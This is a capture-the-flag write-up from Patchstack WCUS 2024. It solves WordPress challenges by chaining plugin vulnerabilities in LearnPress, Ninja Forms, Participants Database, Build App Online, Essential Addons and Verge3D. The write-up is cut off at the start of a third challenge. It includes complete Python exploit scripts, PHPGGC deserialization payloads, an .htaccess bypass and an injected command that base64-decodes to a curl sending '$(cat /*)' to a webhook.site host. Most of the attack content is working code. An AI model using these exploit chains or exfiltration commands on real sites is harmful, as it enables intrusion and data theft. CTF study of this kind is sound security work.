---
id: 10848583-e65d-8026-a1cb-eb7d36f38336
title: Patchstack WCUS CTF Writeup 2024
created_time: 2024-09-21T09:43:00.000Z
last_edited_time: 2024-11-03T11:08:00.000Z
cover_image: ./imgs/patchstack_wcus-ctf_zikqWxNz.png
icon_emoji: 📗
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Patchstack WCUS CTF Writeup 2024
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/patchstack_wcus-ctf_zikqWxNz.png

---

Last weekend, I participated in the Patchstack WCUS CTF and solved all the WordPress challenges. Here's my write-up for each challenge from the Patchstack WCUS CTF 2024.

# Dynasty

## Description

My area have some kind of dynasty where its using related and known component, which is a very bad practice. Proof me that this dynasty is very bad.

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

[Bad Dynasty](http://100.25.255.51:9098/)

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/5d2e0d87-8cfc-4d54-aaec-07a22ace31a5/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466RRTEM6BE%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132310Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJIMEYCIQDeDhg%2Ft6IlHzMpkDzEULCeQxcG0%2BSpiiAItche6%2BIy2gIhAI85un2R5GEuy916Jja6KKX00aLz49xkgvUyUxAN18BsKogECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igzaj188ajNq3%2B7mbP4q3ANte3Bk41HD3EI2MYytM8IXDLR8HzD8zag%2FrFTUFIAopjusTfiTiBlR1jM9DKmb1VHvMZWWKKLQtHwrHUyLCzMffxi4L%2Bm%2F8tQgCfvr6CRUl34vn0DdyTxHIpxuYy5MT8TDf285oO86sM09Ss%2B67iGDMXsLeJImf%2FQsVdBSLqHZFGnSlMdaojMC7R%2BaBRXQAlNM03pDm200eTlnjtX0Dk2njmXh0M4wr4Fheb3aOA%2FUhkIwTTHXOIXJ0fTWrvBOrNjKtMklsl1Vrb02j181Pnf%2F2adpPjELk5RglTHT%2B%2B8CbgCu48uU7jW7hzbjQbT7rORMufLo5fSTth19BrKduKTlPyVKycEG4BNbnmIjg2q%2BOVe0%2BKxuD%2BaImo7LOx89wTKrNGVK01Vy1PwI%2FRinKrUdEYIJ5KuKbjT93PhHkfe64zVdILEcEGA3BWLq9TnbkCYeltMHfbPnY4OdmPNqWEJqefY9BamJ5vUnOSEH7cBWe%2Fcv64dh8tHHPglN0k%2F0VA4SPdt%2B%2BC%2Fj3olHAitUZuI3RbhJRTdVpXtIz6Ua6IhrX7689c41ELuxSPbRSPf%2BeYBOT2xJf8l9Lb0NDPV86VZnCT4%2FxOJgY83ShVj5NYlyt6JQ7X05pdC4S6Yw1jC02MHBBjqkAU1UlBKEiigwy%2FVjhiw%2FPYE31aC96pu9b8xhwCx3d5K8PknR5PmXXsYF5qrEXqr3D1B3mr0Zzar6ercT1PDLOVhHaOb2eQejDeACNqX3cvr%2F2GFYFfHk3Jb6246lGO3K1yHx30r7YBweQK8FsaBSQtKHuj3yl9mg8udFlNTeOASSrDWUmH53NFgno%2BJZn7ySDi5p%2F0Lt495J%2BXrmI9Te03yKLXBZ\&X-Amz-Signature=1a966a2ca49be107d7ebd6f943bad6fc545e22ff3a817071881916c5794ff292\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

To solve this challenge, we need to identify the relevant CVEs included. The challenge contains multiple vulnerabilities, which are listed below:

*   <https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/learnpress/learnpress-wordpress-lms-plugin-42681-unauthenticated-bypass-to-user-registration>

*   <https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/ninja-forms/ninja-forms-384-authenticated-subscriber-arbitrary-shortcode-execution>

*   <https://patchstack.com/database/vulnerability/participants-database/wordpress-participants-database-plugin-2-5-9-2-php-object-injection-vulnerability>

*   PHP Object Injection Gadget in Rollbar Plugin

These four vulnerabilities are crucial for gaining RCE (Remote Code Execution) via PHP Object Injection. Next, we'll discuss how to exploit these vulnerabilities to our advantage.

## Plan for the Vulnerability Chain:

*   **LearnPress - Unauthenticated Bypass to User Registration:**

    This allows us to register as a subscriber without authentication.

*   **Ninja Forms - Subscriber+ Arbitrary Shortcode Execution:**

    As a subscriber, we can execute any shortcode available in WordPress.

*   **Participants Database - PHP Object Injection:**

    This vulnerability can only be exploited if the shortcode exposing the vulnerable form is accessible.

*   **Rollbar Plugin - PHP Object Injection Gadget:**

    This gadget can be used to trigger Remote Code Execution (RCE) once the object injection in Participants Database is accessible.

### Exploitation Flow:

*   First, register using the **Bypass to User Registration** in **LearnPress**.

*   Next, inject the shortcode from **Ninja Forms** to expose the vulnerable **Participants Database** form.

*   Finally, use the **Rollbar plugin** gadget to trigger RCE through the deserialization vulnerability in the **Participants Database**.

```mermaid
graph TD
    A[LearnPress Plugin: Unauthenticated Bypass to User Registration] --> B[Ninja Forms Plugin: Subscriber+ Arbitrary Shortcode Execution]
    B --> C[Participants Database Plugin: PHP Object Injection]
    C --> D[Rollbar Plugin: PHP Object Injection Gadget]
    D --> E[RCE Triggered]
```

## Step-by-Step Guide to Solving the Challenge

### Step 1: Register Using the LearnPress Vulnerability

The first step is to exploit the unauthenticated user registration vulnerability in LearnPress. Here is the vulnerable code breakdown:

**1. The** **`register_routes`** **Function:**
This function sets up a REST API route for registration in LearnPress. The issue lies in the fact that this route is not protected by any authorization mechanism.

```php
public function register_routes() {
    ...SNIP...

    register_rest_route(
        $this->namespace,
        'token/register',  // The vulnerable route
        array(
            'methods'             => WP_REST_Server::CREATABLE,
            'callback'            => array( $this, 'register' ),  // Registration callback
            'permission_callback' => '__return_true',  // Always returns true (no auth check)
        )
    );
}

```

*   **Vulnerable Part:** The `permission_callback` is set to `__return_true`, meaning anyone can access this route, regardless of whether they are authenticated.

**2. The** **`register`** **Function:**
This function processes the registration request when triggered. It accepts user input (`username`, `password`, `email`, etc.) via a POST request.

```php
public function register( WP_REST_Request $request ) {
    $username         = $request->get_param( 'username' );
    $password         = $request->get_param( 'password' );
    $confirm_password = $request->get_param( 'confirm_password' );
    $email            = $request->get_param( 'email' );

    // Calls the function to create a new customer
    $customer_id = LP_Forms_Handler::learnpress_create_new_customer( $email, $username, $password, $confirm_password );
    ...SNIP...
}

```

*   **Key Part:** This function processes user registration data, including username, password, and email.

**3. The** **`learnpress_create_new_customer`** **Function:**
This function is responsible for creating a new user in learnpress.

```php
public static function learnpress_create_new_customer( $email = '', $username = '', $password = '', $confirm_password = '', $args = array(), $update_meta = array() ) {
    ...SNIP...
    $new_customer_data = apply_filters(
        'learnpress_new_customer_data',
        array_merge(
            $args,
            array(
                'user_login' => $username,  // Sets the username
                'user_pass'  => $password,  // Sets the password
                'user_email' => $email,     // Sets the email
            )
        )
    );

    ...SNIP...

    // Inserts the new user into the WordPress database
    $customer_id = wp_insert_user( $new_customer_data );
    ...SNIP...
}

```

*   **Key Part:** This function uses `wp_insert_user` to create a new user in the WordPress database. Since there are no restrictions on the REST API route, anyone can create an account with arbitrary credentials.

To exploit the vulnerability, we will send a POST request to the exposed REST API endpoint (`/wp-json/learnpress/v1/token/register`) to create a new user account.

Here’s the `curl` command to register a new account:

```shell
curl "http://100.25.255.51:9098/wp-json/learnpress/v1/token/register" -XPOST --data "username=dimas&password=dimas1234&confirm_password=dimas1234&email=dimas@g.com"

```

This `curl` command successfully creates an account, even if the default WordPress registration is disabled.

### Step 2: Get Arbitrary Shortcode Execution from Ninja Forms

After gaining subscriber access via the LearnPress vulnerability, the next step is to exploit the arbitrary shortcode execution in Ninja Forms, specifically through the `NF_Display_Preview` class.Vulnerable code breakdown:

**1. The** **`NF_Display_Preview`** **Constructor:**
This constructor is responsible for setting up the preview mode for forms in Ninja Forms. The vulnerability lies in how the form ID (`_form_id`) is handled when passed via a GET request parameter.

```php
public function __construct() {
    if ( ! isset( $_GET['nf_preview_form'] ) ) return;

    // Sanitizes the `nf_preview_form` GET parameter and assigns it to `_form_id`
    $this->_form_id = WPN_Helper::sanitize_text_field($_GET['nf_preview_form']);
    ...SNIP...

    // Adds a filter to process the content when loading a page
    add_filter('the_content', array( $this, 'the_content' ), 9001 );
    ...SNIP...
}

```

*   **Vulnerable Part:** The `nf_preview_form` GET parameter is sanitized but not properly validated to prevent exploitation. It’s passed directly into the `_form_id` variable, allowing potential misuse.

**2. The** **`the_content`** **Function:**
This function is called when the page content is being loaded. It attempts to validate the form ID but contains a logic flaw that allows an attacker to bypass the checks and inject arbitrary shortcodes.

```php
function the_content() {
    if ( ! is_user_logged_in() ) return esc_html__( 'You must be logged in to preview a form.', 'ninja-forms' );

    // Checks if the `_form_id` is a valid form ID
    $tmp_id_test = explode( '-', $this->_form_id );

    // Bypassable checks
    if ( 1 === count( $tmp_id_test) && ! is_numeric( $tmp_id_test[ 0 ] ) ) {
        return esc_html__( 'You must provide a valid form ID.', 'ninja-forms' );
    }
    elseif ( 2 === count( $tmp_id_test ) && ('tmp' != $tmp_id_test[ 0 ] || ! is_numeric( $tmp_id_test[ 1 ] ) ) ) {
        return esc_html__( 'You must provide a valid form ID.', 'ninja-forms' );
    }

    // Vulnerable: Renders shortcode with injected content
    return do_shortcode( "[nf_preview id='{$this->_form_id}']" );
}

```

*   **Key Part:** The function processes the `_form_id` and passes it directly to the `do_shortcode` function, which renders WordPress shortcodes. Due to flawed validation, an attacker can inject additional shortcodes by manipulating the `_form_id`.

To exploit this vulnerability, you can inject additional shortcodes by manipulating the `_form_id` in the GET request. Here’s how you can bypass the validation and inject malicious shortcodes.

**Exploit Example:**

You can bypass the form ID validation by adding a third `-` character to the `_form_id`, which isn't properly accounted for in the checks. This allows you to inject a shortcode like `[pdb_signup]` (used by the vulnerable Participants Database plugin).

Example payload:

```shell
http://<target-url>/?nf_preview_form=tmp-1-'][pdb_signup]

```

**Explanation:**

*   The injected `_form_id` is set to `tmp-1-'][pdb_signup]`. The validation only checks for 1 or 2 elements split by the `-` character, but you can bypass this by using 3 elements.

*   The injected shortcode `[pdb_signup]` will be executed by the `do_shortcode` function, leading to the exposure of the object injection vulnerability in **Participants Database**.

### Step 3: Getting Remote Code Execution (RCE) via Object Injection in Participants Database

In this step, we aim to exploit the **Object Injection** vulnerability in the **Participants Database** plugin to achieve **Remote Code Execution (RCE)**.

Vulnerable Code Overview:

**1. Entry Point:**
The function `print_shortcode()` is responsible for handling shortcode rendering in Participants Database. Specifically, the `[pdb_signup]` shortcode is vulnerable to object injection.

```php
foreach( self::plugin_shortcode_list() as $tag ) {
    add_shortcode( $tag, array(__CLASS__, 'print_shortcode') );
}

```

**2. Handling the** **`[pdb_signup]`** **Shortcode:**

```php
public static function print_shortcode( $params, $content, $tag ) {
    switch ( $tag ) {
        case 'pdb_signup':
            return self::print_signup_form( $shortcode_parameters );
            break;
        ...SNIP...
    }
}

```

This function calls `self::print_signup_form()`, which leads to further function calls, eventually reaching the **unserialize()** function.

**3. Call Chain:**
Here’s the function call chain that leads to the vulnerable `unserialize()` function:

*   `Participants_Db::print_signup_form`

*   `Participants_Db::print_signup_class_form`

*   `PDb_Signup::print_form`

*   `PDb_Signup::__construct`

*   `PDb_Shortcode::_setup_iteration`

*   `PDb_Shortcode::_set_field_value`

*   `PDb_Shortcode::esc_submitted_value`

*   **`maybe_unserialize()`**

*   **`unserialize()`**

By reaching `unserialize()`, we can inject a malicious payload that leads to RCE.

**Exploiting Object Injection Using Rollbar Gadget:**

Participants Database interacts with the Rollbar plugin, which includes the **Monolog library**. **Monolog** in version 2.9.1 contains a gadget chain that allows us to trigger code execution through object deserialization.

To generate a malicious deserialization payload, we can use **PHPGGC**, a tool designed to generate payloads for various PHP object injection vulnerabilities.

**Generating Payload Using PHPGGC:**

Use the following command with **PHPGGC** to generate the payload that executes the `id` command:

```shell
./phpggc Monolog/RCE7 system 'id'

```

This payload leverages the **Monolog/RCE7** gadget in Monolog 2.9.1, allowing us to execute arbitrary commands on the server.

**Exploitation Script:**

Here’s the full script to exploit the Participants Database vulnerability and achieve RCE. This script sends the malicious payload to the vulnerable form, exploiting the shortcode injection vulnerability from Step 2.

**Note:** You need to register and log in first, then retrieve the WordPress session cookies from your browser's developer console.

```python
import os
import httpx
import asyncio
import re

URL = "http://100.25.255.51:9098/"

COOKIE_KEY = "wordpress_ecba2824d7e5519070149e59e3419978"
COOKIE_VALUE = "dimas|1727242988|Auxt79A9gcUAVmknKpAjqxvbmbOagfzanIoEhC0LmqL|1b5c0055e2f676e129c07c5ad658276c42137203fb6a5c17b792de1967583eb3"

# curl "http://100.25.255.51:9098/wp-json/learnpress/v1/token/register" -XPOST --data "username=dimas&password=dimas1234&confirm_password=dimas1234&email=dimas@g.com"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=10000)
        self.c.cookies.set(COOKIE_KEY, COOKIE_VALUE)

class API(BaseAPI):
    ...

async def main():
    api = API()
    res = await api.c.get("/", params={
        "nf_preview_form": "tmp-1-'][pdb_signup]"
    })
    session_hash = re.findall("session_hash\" type=\"hidden\" value=\"(.*?)\"", res.text).pop()
    s = os.popen("./phpggc/phpggc Monolog/RCE7 system 'cat /*'").read()
    print(s)
    res = await api.c.post("/", params={
        "nf_preview_form": "tmp-1-'][pdb_signup]"
    }, data={
        "action": "signup",
        "session_hash": session_hash,
        "first_name": s,
    })
    print(res.text)


if __name__ == "__main__":
    asyncio.run(main())
```

## Flag

CTF{dynasty\_is\_bad\_very\_bad\_honestly\_and\_its\_not\_a\_value\_9102bcbd12}

# Oily Garchy

## Description

I have a wrestle opponent named garchy, he is so oilly and so dirty. We have to find a way to fight back when it matters, help me to fight back!

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

<http://100.25.255.51:9099/>

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/f36bc266-6848-4dbb-b492-a9e7a5fb733a/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466RRTEM6BE%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132310Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJIMEYCIQDeDhg%2Ft6IlHzMpkDzEULCeQxcG0%2BSpiiAItche6%2BIy2gIhAI85un2R5GEuy916Jja6KKX00aLz49xkgvUyUxAN18BsKogECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igzaj188ajNq3%2B7mbP4q3ANte3Bk41HD3EI2MYytM8IXDLR8HzD8zag%2FrFTUFIAopjusTfiTiBlR1jM9DKmb1VHvMZWWKKLQtHwrHUyLCzMffxi4L%2Bm%2F8tQgCfvr6CRUl34vn0DdyTxHIpxuYy5MT8TDf285oO86sM09Ss%2B67iGDMXsLeJImf%2FQsVdBSLqHZFGnSlMdaojMC7R%2BaBRXQAlNM03pDm200eTlnjtX0Dk2njmXh0M4wr4Fheb3aOA%2FUhkIwTTHXOIXJ0fTWrvBOrNjKtMklsl1Vrb02j181Pnf%2F2adpPjELk5RglTHT%2B%2B8CbgCu48uU7jW7hzbjQbT7rORMufLo5fSTth19BrKduKTlPyVKycEG4BNbnmIjg2q%2BOVe0%2BKxuD%2BaImo7LOx89wTKrNGVK01Vy1PwI%2FRinKrUdEYIJ5KuKbjT93PhHkfe64zVdILEcEGA3BWLq9TnbkCYeltMHfbPnY4OdmPNqWEJqefY9BamJ5vUnOSEH7cBWe%2Fcv64dh8tHHPglN0k%2F0VA4SPdt%2B%2BC%2Fj3olHAitUZuI3RbhJRTdVpXtIz6Ua6IhrX7689c41ELuxSPbRSPf%2BeYBOT2xJf8l9Lb0NDPV86VZnCT4%2FxOJgY83ShVj5NYlyt6JQ7X05pdC4S6Yw1jC02MHBBjqkAU1UlBKEiigwy%2FVjhiw%2FPYE31aC96pu9b8xhwCx3d5K8PknR5PmXXsYF5qrEXqr3D1B3mr0Zzar6ercT1PDLOVhHaOb2eQejDeACNqX3cvr%2F2GFYFfHk3Jb6246lGO3K1yHx30r7YBweQK8FsaBSQtKHuj3yl9mg8udFlNTeOASSrDWUmH53NFgno%2BJZn7ySDi5p%2F0Lt495J%2BXrmI9Te03yKLXBZ\&X-Amz-Signature=c6ee89b26e907340dace5901118fb31c76e70d0bf4011acc430213f147e01b40\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

To solve this challenge, we need to chain multiple vulnerabilities together for Remote Code Execution (RCE). Here are the relevant vulnerabilities and their CVEs:

*   [Build App Online Plugin - Authenticated Privilege Escalation](https://patchstack.com/database/vulnerability/build-app-online/wordpress-build-app-online-plugin-1-0-19-authenticated-privilege-escalation-vulnerability)

*   File Upload Gadget in MStore API (via GuzzleHTTP)

*   Limited Remote Code Execution in Verge3D

*   [Essential Addons for Elementor - PHP Object Injection](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/essential-addons-for-elementor-lite/essential-addons-for-elementor-5913-authenticated-author-php-object-injection-via-error-resetpassword)

By chaining these vulnerabilities, we can achieve RCE to capture the flag.

## Plan for the Vulnerability Chain:

*   **Login via Build App Online:**

    This step allows us to authenticate and escalate privileges.

*   **Privilege Escalation Using Build App Online:**

    We escalate privileges to gain more control, enabling further exploitation.

*   **Trigger PHP Object Injection in Essential Addons for Elementor:**

    With higher privileges, we can exploit the PHP Object Injection vulnerability.

*   **File Upload via MStore API Gadget:**

    Using the MStore API, we can upload a malicious file leveraging the GuzzleHTTP gadget.

*   **Bypass File Restrictions in Verge3D:**

    After uploading the file, because we can’t directly write into `/var/www/html`, we can use code injection by bypass file existence and writable checks in Verge3D, eventually injecting code into the vulnerable `v3d_terminal` function to gain RCE.

## Exploitation Flow:

```mermaid
graph TD
    A[Build App Online - Login] --> B[Privilege Escalation]
    B --> C[Essential Addons for Elementor - PHP Object Injection]
    C --> D[MStore API - File Upload Gadget]
    D --> E[Verge3D - Code Injection via v3d_terminal]
    E --> F[RCE Triggered]
```

## Step-by-Step Guide:

### Step 1: **Login via Build App Online**

We start by exploiting a vulnerable AJAX endpoint in the Build App Online plugin that allows us to create a user account without authentication. The endpoint `build-app-online-create-user` is accessible to unauthenticated users because of the `nopriv` action.

Here's the relevant code snippet:

```php
$this->loader->add_action('wp_ajax_nopriv_build-app-online-create-user', $plugin_public, 'create_user');

```

In the `create_user` function, we see the following logic, where new users can be created:

```php
public function create_user(){
    if (isset($_REQUEST['email']) && isset($_REQUEST['first_name']) && isset($_REQUEST['last_name'])) {
        // Create user logic here
        $user_id = wp_create_user($user_name, $password, $user_name);
    }
}

```

We can exploit this by making the following request to register a new user:

```python
res = await api.c.post("/wp-admin/admin-ajax.php", params={
    "action": "build-app-online-create-user",
    "email": creds,
    "password": creds,
    "first_name": creds,
    "last_name": creds,
    "phone": "0",
})

```

This will create a user with the provided credentials.

***

### Step 2: **Privilege Escalation via Build App Online**

Once registered and logged in, we escalate our privileges using another vulnerable AJAX endpoint, `build-app-online-update-address`, which updates user metadata. The endpoint is defined as follows:

```php
$this->loader->add_action('wp_ajax_nopriv_build-app-online-update-address', $plugin_public, 'update_address');

```

Here’s the function:

```php
public function update_address(){
    $user_id = get_current_user_id();
    if($user_id){
        foreach($_POST as $key => $value) {
            if(is_array($value)){
                if (!array_key_exists("administrator", $value) && !array_key_exists("editor", $value) && !array_key_exists("author", $value)){
                    update_user_meta($user_id, sanitize_text_field($key), $value);
                }
            } else {
                update_user_meta($user_id, sanitize_text_field($key), $value);
            }
        }
        wp_send_json(true);
    } else {
        wp_send_json(false);
    }
}

```

This function allows users to update their metadata, but there are restrictions that prevent us from escalating privileges to `administrator`, `editor`, or `author`. However, we can assign ourselves `contributor` privileges and additional capabilities like `manage_verge3d`, which we will use in later steps.

We can craft the following request to change our user’s capabilities:

```python
res = await api.c.post("/wp-admin/admin-ajax.php", params={
    "action": "build-app-online-update-address",
}, data={
    "wp_capabilities[contributor]": 1,
    "wp_capabilities[manage_verge3d]": 1,
})

```

By assigning these capabilities, we can progress further in the exploitation process and gain the ability to manage certain functionalities, such as those in **Verge3D**.

### Step 3: **Exploiting PHP Object Injection in Essential Addons for Elementor**

By adding the `wp_capabilities[contributor]` role, we gain access to create posts on the target WordPress site. This allows us to exploit the vulnerable code in **MStore API**.

There’s a WAF (Web Application Firewall) in the `.htaccess` file, as shown below:

```xml
# BEGIN WordPress
# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
# dynamically generated, and should only be modified via WordPress filters.
# Any changes to the directives between these markers will be overwritten.
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{THE_REQUEST} media($|\\ |\\?)  [NC]
RewriteRule .*  - [F]
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
RewriteBase /
RewriteRule ^index\\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
RewriteRule ^wp-admin/edit.php$ - [F]
RewriteRule ^wp-admin/post-new.php$ - [F]
RewriteRule ^wp-admin/post.php$ - [F]
RewriteRule ^wp-admin/edit-comments.php$ - [F]
</IfModule>

```

This configuration blocks access to certain admin pages like `/wp-admin/edit.php` and `/wp-admin/post-new.php`. However, you can bypass this restriction by simply adding a slash (`/`) at the end of the URL, like so: `/wp-admin/post-new.php/`.

Once you bypass the restriction and create a new post, click the "Edit with Elementor" button to access Elementor’s editor. You can then embed a vulnerable element into the post, as shown in the image below:

![](./imgs/image_US7b0HOl.png)

After embedding the element, configure the settings as follows:

![](./imgs/image_qe3F6WwX.png)

Next, submit the form and intercept the request. Modify the JSON data by adding `error_resetpassword` as the injection point for your PHP Object Injection payload in the `actions` section, next to the `err_email` field.

In my case, I automated this process with a Python script to handle encoding issues (as the unserialized payload contains null bytes):

```python
    with open("test.json", "r") as f:
        data = f.read()
...SNIP...
    res = await api.c.post("/wp-admin/admin-ajax.php", data={
        "action": "elementor_ajax",
        "initial_document_id": post_id,
        "editor_post_id": post_id,
        "_nonce": elementor_nonce,
        "actions": data.replace('"err_email":"You have used an invalid email"', '"error_resetpassword": "' + encode_null_byte(exploit).replace('"', '\\\\"') + '"')
    })

```

Here, `test.json` is the action JSON you intercepted after clicking submit. The script modifies the JSON payload to inject the serialized PHP Object Injection exploit.

### Step 4: **File Upload Using MStore API Gadget**

The target WordPress site uses **Guzzle v7.8.1** in the MStore API plugin, located in `/wp-content/plugins/mstore-api/vendor/guzzlehttp/guzzle`. This version of Guzzle is vulnerable to a file upload exploit. However, since `/var/www/html` is not writable, we can't directly upload files to gain RCE (Remote Code Execution). Instead, we use this vulnerability to bypass certain restrictions in **Verge3D**.

The exploit for file upload will send a stored PHP Object Injection payload. Here's the relevant request:

```python
path = f"/tmp/hacked"
exploit = check_output(["./phpggc/phpggc", "Guzzle/FW1", path, "<your file>"])
await api.c.post("/wp-admin/admin-ajax.php", data={
    "action": "elementor_ajax",
    "initial_document_id": post_id,
    "editor_post_id": post_id,
    "_nonce": elementor_nonce,
    "actions": data.replace('"err_email":"You have used an invalid email"', '"error_resetpassword": "' + encode_null_byte(exploit).replace('"', '\\\\"') + '"')
})

```

In this process:

*   The payload is generated using **PHPGGC** with the `Guzzle/FW1` gadget.

*   The file is uploaded to the `/tmp/hacked` directory on the remote server.

This allows us to further exploit the system by bypassing some restriction in **Verge3D**

### Step 5: **Code Injection in Verge3D**

In **Verge3D**, there's a function called `v3d_terminal`, which is equivalent to executing system commands:

```php
function v3d_terminal($command) {
    $output = '';
    if (function_exists('system')) {
        ob_start();
        system($command, $return_var);
        $output = ob_get_contents();
        ob_end_clean();
    }
}

```

This function is called by `v3d_gen_email_attachments`:

```php
function v3d_gen_email_attachments($order, $order_id, $gen_custom, $gen_pdftypes=array()) {
    ...SNIP...
    $pdf_html = $temp_dir.wp_unique_filename($temp_dir, uniqid('v3d_email_att').'.html');
    $pdf = v3d_get_attachments_tmp_dir($attachments).$pdftype.'.pdf';
    $success = file_put_contents($pdf_html, $pdf_html_text);

    if ($success) {
        v3d_terminal($chrome_path.' --headless --disable-gpu --print-to-pdf='.$pdf.' '.$pdf_html);
        if (is_file($pdf)) {
            $attachments[] = $pdf;
        }
    }
    @unlink($pdf_html);
}

```

The `file_put_contents` function checks if the file exists before executing the command via `v3d_terminal`, allowing for potential code injection. By ensuring our uploaded file exists, we can exploit this check and execute arbitrary commands.

We use the `manage_verge3d` capability to bypass access restrictions in Verge3D settings, which is crucial for triggering this injection.

Here's my final payload, which demonstrates the entire process:

```python
import base64
import json
import os
import httpx
import asyncio
import re
from subprocess import check_output

# URL = "http://0.0.0.0:9099"
URL = "http://100.25.255.51:9099"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    ...
    async def get_elementor_nonce(self, post_id):
        res = await self.c.get("/wp-admin/")
        heartbeat_nonce = re.findall('var heartbeatSettings = {"nonce":"(.*?)"};', res.text)[0]
        res = await self.c.post("/wp-admin/admin-ajax.php", data={
            "data[elementor_post_lock][post_ID]": post_id,
            "interval": 15,
            "_nonce": heartbeat_nonce,
            "action": "heartbeat",
            "screen_id": "front",
            "has_focus": "false"
        })
        elementor_nonce = res.json()['elementorNonce']
        return elementor_nonce
def encode_null_byte(byte_data):
    return ''.join(r'\u0000' if byte == 0 else chr(byte) for byte in byte_data)

async def main():
    api = API()
    creds = "dimas@dimas.com"
    post_id = 163
    res = await api.c.post("/wp-admin/admin-ajax.php", params={
        "action": "build-app-online-create-user",
        "email": creds,
        "password": creds,
        "first_name": creds,
        "last_name": creds,
        "phone": "0",
    })
    res = await api.c.post("/wp-login.php", data={
        "log": creds,
        "pwd": creds
    })
    res = await api.c.post("/wp-admin/admin-ajax.php", params={
        "action": "build-app-online-update-address",
    }, data={
        "wp_capabilities[contributor]": 1,
        "wp_capabilities[manage_verge3d]": 1,
    })


    elementor_nonce = await api.get_elementor_nonce(post_id)
    with open("test.json", "r") as f:
        data = f.read()
    payload = base64.b64encode(b"curl https://webhook.site/cb9a10cb-a3d9-4e4c-b0e9-b4142cb0d852 -XPOST --data \"$(cat /*)\"").decode()
    path = f"/tmp/foo||echo {payload} | base64 -d |bash #"
    exploit = check_output(["./phpggc/phpggc","Guzzle/FW1",path,"./index.php"])

    print(path.replace("/tmp", URL+"/wp-admin/admin.php?page=verge3d_order&action=genpdf&order=asd&pdftype=").replace("#", "%23"))
    res = await api.c.post("/wp-admin/admin-ajax.php", data={
        "action": "elementor_ajax",
        "initial_document_id": post_id,
        "editor_post_id": post_id,
        "_nonce": elementor_nonce,
        "actions": data.replace('"err_email":"You have used an invalid email"', '"error_resetpassword": "'+encode_null_byte(exploit).replace('"', '\\"')+'"')
    })

    # print(res.json())

    res = await api.c.get(f"/?p={post_id}")

    nonce = re.findall('name="eael-lostpassword-nonce".*?value="(.*?)"', res.text, re.DOTALL)[0]
    widget_id = re.findall('name="widget_id".*?value="(.*?)"', res.text, re.DOTALL)[0]


    # print(nonce, widget_id)
    res = await api.c.post(f"/?p={post_id}", data={
        "eael-resetpassword-submit": 1,
        "eael-resetpassword-nonce": nonce,
        "page_id": post_id,
        "widget_id": widget_id,
        "eael-pass1": "foobar",
        "eael-pass2": "foobar"
    })
    # print(res.text)




if __name__ == "__main__":
    asyncio.run(main())
```

**Important Note:**

Before running this script, make sure to create a post manually and save the action JSON in `test.json`. This JSON should be captured when you submit the request. Also, don't forget to change the webhook URL in the payload.

After successfully running all the code, access the following URL:

```xml
http://<wp-url>/wp-admin/admin.php?page=verge3d_order&action=genpdf&order=asd&pdftype=<filename>

```

**Example:**

```xml
http://100.25.255.51:9099/wp-admin/admin.php?page=verge3d_order&action=genpdf&order=asd&pdftype=/foo||echo Y3VybCBodHRwczovL3dlYmhvb2suc2l0ZS9kYTMxMmQ4ZS1iZDdhLTQ3Y2YtYWZjNy1kZDZhNWQ2YzU0YjkgLVhQT1NUIC0tZGF0YSAiJChjYXQgLyopIg== | base64 -d |bash %23

```

The flag will be sent to the webhook:

## Flag

![](./imgs/image_cJWtsAfX.png)

# **Resistance**

## Description

We have to be resistance to this very bad condition. Do you agree ?

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

<http://100.25.255.51:9089/>

## How to Solve

To identify the vulnerability in this challenge, compare the original WordPress version 6.3.5 with the custom version provided by the author. A `diff` between the two reveals some interesting changes:

```diff
diff '--color=auto' -r wordpress/wp-includes/blocks/template-part.php 6.3.5/wordpress/wp-includes/blocks/template-part.php
70,71d69
<                               // Normalize path for Windows servers
<                               $attributes['slug']= wp_normalize_path( $attributes['slug'] );
diff '--color=auto' -r wordpress/wp-includes/functions.php 6.3.5/wordpress/wp-includes/functions.php
6043a6044,6046
>       // Normalize path for Windows servers
>       $file = wp_normalize_path( $file );

```

